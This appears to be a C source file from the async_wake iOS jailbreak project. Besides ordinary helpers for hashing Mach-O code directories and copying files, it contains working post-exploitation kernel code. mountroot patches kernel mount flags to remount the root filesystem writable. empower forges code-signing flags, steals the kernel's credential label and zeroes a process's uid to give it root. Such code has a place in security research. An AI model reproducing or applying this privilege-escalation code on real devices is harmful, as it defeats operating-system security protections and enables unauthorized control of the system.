//
//  fun_utils.c
//  async_wake_ios
//
//  Created by George on 18/12/17.
//  Copyright © 2017 Ian Beer. All rights reserved.
//

#include "fun_utils.h"
#include "kmem.h"
#include "patchfinder64.h"
#include "symbols.h"
#include "kcall.h"
#include "sys/mount.h"
#include "csdefs.h"

uint32_t swap_uint32(uint32_t val) {
	val = ((val << 8) & 0xFF00FF00 ) | ((val >> 8) & 0xFF00FF );
	return (val << 16) | (val >> 16);
}

uint8_t *get_sha256_inplace(uint8_t* code_dir, uint8_t out[CC_SHA256_DIGEST_LENGTH]) {
    uint32_t* code_dir_int = (uint32_t*)code_dir;

    uint32_t realsize = 0;
    for (int j = 0; j < 10; j++) {
        if (swap_uint32(code_dir_int[j]) == 0xfade0c02) {
            realsize = swap_uint32(code_dir_int[j+1]);
            code_dir += 4*j;
        }
    }

    CC_SHA256(code_dir, realsize, out);

    return out;
}

uint8_t *get_sha256(uint8_t* code_dir) {
	uint8_t *out = malloc(CC_SHA256_DIGEST_LENGTH);
    get_sha256_inplace(code_dir, out);
	return out;
}

uint8_t *get_code_directory(const char* name) {
	// Assuming it is a macho
	
	FILE* fd = fopen(name, "r");
	
	printf("%s\n", name);
	
	struct mach_header_64 mh;
	fread(&mh, sizeof(struct mach_header_64), 1, fd);
	
	long off = sizeof(struct mach_header_64);
	for (int i = 0; i < mh.ncmds; i++) {
		struct load_command cmd;
		fseek(fd, off, SEEK_SET);
		fread(&cmd, sizeof(struct load_command), 1, fd);
		if (cmd.cmd == 0x1d) {
			uint32_t off_cs;
			fread(&off_cs, sizeof(uint32_t), 1, fd);
			uint32_t size_cs;
			fread(&size_cs, sizeof(uint32_t), 1, fd);
			
			uint8_t *cd = malloc(size_cs);
			fseek(fd, off_cs, SEEK_SET);
			fread(cd, size_cs, 1, fd);
			return cd;
		} else {
			off += cmd.cmdsize;
		}
	}
	return NULL;
}


int cp(const char *from, const char *to) {
	int fd_to, fd_from;
	char buf[4096];
	ssize_t nread;
	int saved_errno;
	
	fd_from = open(from, O_RDONLY);
	if (fd_from < 0)
		return -1;
	
	fd_to = open(to, O_WRONLY | O_CREAT | O_EXCL, 0666);
	if (fd_to < 0)
		goto out_error;
	
	while ((nread = read(fd_from, buf, sizeof buf)) > 0)
	{
		char *out_ptr = buf;
		ssize_t nwritten;
		
		do {
			nwritten = write(fd_to, out_ptr, nread);
			
			if (nwritten >= 0)
			{
				nread -= nwritten;
				out_ptr += nwritten;
			}
			else if (errno != EINTR)
			{
				goto out_error;
			}
		} while (nread > 0);
	}
	
	if (nread == 0)
	{
		if (close(fd_to) < 0)
		{
			fd_to = -1;
			goto out_error;
		}
		close(fd_from);
		
		/* Success! */
		return 0;
	}
	
out_error:
	saved_errno = errno;
	
	close(fd_from);
	if (fd_to >= 0)
		close(fd_to);
	
	errno = saved_errno;
	return -1;
}

int file_exist (char *filename) {
	struct stat   buffer;
	return (stat (filename, &buffer) == 0);
}


// unset MNT_ROOTFS flag, remount, set it back
// based on xerub's extra_recipe code
int mountroot(void) {
    int ret;

    uint64_t _rootvnode = find_rootvnode();
    uint64_t rootfs_vnode = rk64(_rootvnode);

    // We read and write v_flag one byte shifted into v_kernel_flag
    // because lower byte is not needed to unset ROOTFS flag
    // and because it contains RDONLY and we don't want to write back
    // old value of RDONLY :)

    // read original flags
    uint64_t v_mount = rk64(rootfs_vnode + koffset(KSTRUCT_OFFSET_VNODE_V_UN));
    uint32_t v_flag = rk32(v_mount + koffset(KSTRUCT_OFFSET_MOUNT_MNT_FLAG) + 1);

    // unset rootfs flag
    wk32(v_mount + koffset(KSTRUCT_OFFSET_MOUNT_MNT_FLAG) + 1, v_flag & ~(MNT_ROOTFS >> 8));

    // remount
    char *nmz = strdup("/dev/disk0s1s1");
    ret = mount("msdos", "/", MNT_UPDATE, (void *)&nmz);

    // set original flags back
    v_mount = rk64(rootfs_vnode + koffset(KSTRUCT_OFFSET_VNODE_V_UN));
    wk32(v_mount + koffset(KSTRUCT_OFFSET_MOUNT_MNT_FLAG) + 1, v_flag);

    return ret;
}

uint64_t kern_ucred = 0;

int empower(uint64_t proc) {
    if (kern_ucred == 0) {
        return -1;
    }

    uint32_t csflags = rk32(proc + koffset(KSTRUCT_OFFSET_PROC_P_CSFLAGS));
    csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW | CS_VALID) & ~CS_ALLOWED_MACHO;
    wk32(proc + koffset(KSTRUCT_OFFSET_PROC_P_CSFLAGS), csflags);
    printf("empower proc at %llx\n", proc);

    uint64_t self_ucred = 0;
    kcall(find_copyout(), 3, proc + koffset(KSTRUCT_OFFSET_PROC_UCRED), &self_ucred, sizeof(self_ucred));

    // steal kernel's label
    kcall(find_bcopy(), 3, kern_ucred + 0x78, self_ucred + 0x78, sizeof(uint64_t));

    // set uid, real uid, saved uid to 0
    kcall(find_bzero(), 2, self_ucred + 0x18, 12);

    return 0;
}

void init_empower(uint64_t kern_proc) {
    kcall(find_copyout(), 3, kern_proc + koffset(KSTRUCT_OFFSET_PROC_UCRED), &kern_ucred, sizeof(kern_ucred));
}
